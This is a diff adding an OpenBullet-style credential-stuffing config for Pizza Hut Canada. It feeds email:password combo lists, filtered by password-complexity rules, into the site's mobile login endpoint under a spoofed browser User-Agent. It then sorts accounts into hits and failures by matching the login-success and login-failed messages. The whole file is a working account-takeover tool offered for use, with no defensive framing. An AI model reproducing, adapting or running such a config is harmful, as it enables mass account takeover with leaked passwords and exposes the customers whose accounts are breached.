@@ -1,0 +1,61 @@
+[SETTINGS]
+{
+  "Name": "Pizzahut (Canada)",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-22T00:09:57.7458404+00:00",
+  "AdditionalInfo": "",
+  "Author": "1337 | Goon",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Lowercase",
+      "Id": 742064802
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Uppercase",
+      "Id": 689256733
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 1916039075
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Symbol",
+      "Id": 1094322007
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.pizzahut.ca/mobilem8-web-service/rest/mobilem8/doLoginCheck" AutoRedirect=TRUE 
+  CONTENT "user=<USER>&t=1526947433598&tenant=ph-canada&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "login failed: invalid username and/or password" 
+  KEYCHAIN Success OR 
+    KEY "Login Successful." 
